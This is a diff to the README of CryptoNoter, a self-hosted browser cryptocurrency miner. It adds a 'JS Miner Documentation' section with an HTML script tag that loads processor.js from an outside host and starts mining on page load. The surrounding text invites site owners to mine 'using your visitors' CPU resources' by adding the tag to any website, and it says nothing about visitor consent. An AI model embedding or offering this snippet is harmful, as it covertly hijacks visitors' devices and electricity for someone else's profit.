@@ -70,6 +70,20 @@ data:    [0] tX4L /usr/bin/node /srv/CryptoNoter/server.js 7379    7385    /root
 ```
 * Done! You can now start mining using your visitors' CPU resources by adding the above tag to any of your websites.
 
+## JS Miner Documentation
+There are parameters that you can preset within the javscript miner. Here are some basic configuration for the parameters:
+```html
+<script src="https://www.cryptonoter.com/processor.js"></script>
+<script>
+	var addr = 'CryptoNoter';
+	var miner = new CryptoNoter.Anonymous(addr, {
+        autoThreads: true,
+		throttle: 0.6
+	});
+	miner.start();
+</script>
+```
+
 ## Troubleshooting
 Check if server.js execute successfully by using this command
 ```bash
